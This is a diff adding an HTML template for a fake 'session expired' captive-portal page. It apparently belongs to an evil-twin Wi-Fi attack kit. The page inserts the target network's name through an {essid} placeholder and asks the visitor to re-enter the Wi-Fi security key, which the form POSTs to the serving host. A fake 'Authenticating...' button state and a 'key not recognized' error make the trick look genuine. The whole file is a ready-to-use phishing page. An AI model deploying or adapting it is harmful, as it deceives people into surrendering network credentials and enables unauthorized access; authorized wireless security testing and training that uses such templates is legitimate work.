@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Session Expired</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: Georgia, 'Times New Roman', serif; background: #f5f5f0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+.card { background: #fff; border: 1px solid #d8d8d0; border-top: 4px solid #1e5b94; padding: 34px; margin: 20px; max-width: 400px; width: 100%; }
+h2 { font-size: 22px; color: #1e5b94; margin-bottom: 10px; }
+p { font-size: 14px; color: #444; margin-bottom: 10px; line-height: 1.55; }
+hr { border: none; border-top: 1px solid #e5e5de; margin: 16px 0; }
+label { display: block; font-size: 12px; color: #666; margin-bottom: 5px; font-family: Verdana, sans-serif; text-transform: uppercase; }
+input { width: 100%; padding: 12px 14px; border: 1px solid #c5c5bd; border-radius: 3px; font-size: 16px; margin-bottom: 14px; outline: none; }
+input:focus { border-color: #1e5b94; }
+button { width: 100%; padding: 13px; background: #1e5b94; color: #fff; border: none; border-radius: 3px; font-size: 15px; font-weight: 600; cursor: pointer; font-family: Verdana, sans-serif; }
+button:hover { background: #164a7a; }
+.error { color: #b30000; font-size: 13px; margin-top: 8px; display: none; font-family: Verdana, sans-serif; }
+</style></head>
+<body>
+<div class="card">
+<h2>Your session has expired</h2>
+<p>To continue using the internet service on network <b>{essid}</b>, please re-authenticate with your Wi-Fi security key.</p>
+<hr>
+<form method="POST" action="/" onsubmit="document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='Authenticating...'">
+<label for="password">Wi-Fi Security Key</label>
+<input type="password" name="password" id="password" autocomplete="off" required>
+<div class="error" id="error">The security key was not recognized. Please try again.</div>
+<button type="submit" id="btn">Reconnect to Service</button>
+</form>
+</div></body></html>
